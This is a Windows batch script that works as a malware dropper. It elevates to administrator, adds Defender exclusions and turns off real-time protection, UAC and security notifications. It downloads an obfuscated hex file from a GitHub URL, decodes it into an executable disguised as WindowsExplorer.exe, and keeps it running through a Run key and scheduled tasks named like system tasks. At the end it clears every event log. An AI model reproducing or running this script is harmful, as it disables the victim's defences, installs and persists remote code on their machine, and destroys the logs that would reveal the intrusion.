@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
Powershell -windowstyle hidden Add-MpPreference -ExclusionPath '%systemdrive%'
echo -----------Defender-bypass------------------------
Powershell Add-MpPreference -ExclusionPath 'c:\'
Powershell Add-MpPreference -ExclusionPath '%tmp%'
Powershell Add-MpPreference -ExclusionPath '%appdata%'
Powershell Add-MpPreference -ExclusionPath '%systemdrive%\programdata\Windata'
Powershell Add-MpPreference -ExclusionProcess 'powershell.exe'
Powershell Add-MpPreference -ExclusionPath 'C:\ProgramData\GG-Win'
echo ---------regedit-edite------------------------------------------------
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v TamperProtection /t REG_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cls
echo --------------------create-my-path--------------------------------------------------
mkdir "%systemdrive%\programdata\GG-Win"
echo ----------------------------download-hex-file-------------------------------------
PowerShell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/ibrahem1012/WindowsExplorer/raw/main/WindowsExplorer.txt','%programdata%\GG-Win\WindowsExplorer.txt')"
echo ----------------------decode-obfuscated-hex----------------------------------------
PowerShell.exe -Command "(Get-Content '%programdata%\GG-Win\WindowsExplorer.txt') -replace '\$', '0' -replace '\^', '1' -replace '#', '4' | Out-File '%programdata%\GG-Win\decoded_hex.txt' -Encoding ASCII"
echo ----------------------convert-hex-to-exe-----------------------------------------
PowerShell.exe -Command "Get-Content '%programdata%\GG-Win\decoded_hex.txt' | ForEach-Object { $_ -replace '[^0-9A-Fa-f]', '' } | Out-File '%programdata%\GG-Win\clean_hex.txt' -Encoding ASCII"
PowerShell.exe -Command ^
"$hex = Get-Content '%programdata%\GG-Win\clean_hex.txt' -Raw; ^
$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) { [Convert]::ToByte($hex.Substring($i,2),16) }; ^
[IO.File]::WriteAllBytes('%programdata%\GG-Win\WindowsExplorer.exe', $bytes)"
echo -----------start-payload------------------------
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe"
schtasks /create /tn WindowsUpdate /ru "%username%" /sc minute /mo 5 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.exe" /f
start %programdata%\GG-Win\WindowsExplorer.exe
copy %TEMP%\WindowsExplorer.bat %ProgramData%\GG-Win\WindowsExplorer.bat /Y
schtasks /create /tn WindowsExplorer /ru "%username%" /sc minute /mo 45 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.bat" /f
powershell -WindowStyle Hidden -Command "if (-not (Get-Process -Name 'WindowsExplorer' -ErrorAction SilentlyContinue)) {Start-Process '%ProgramData%\GG-Win\WindowsExplorer.exe' -WindowStyle Hidden}"
echo -----------delete-event-log-------------------------------------------
for /F "tokens=*" %%1 in ('wevtutil.exe el') DO wevtutil.exe cl "%%1"
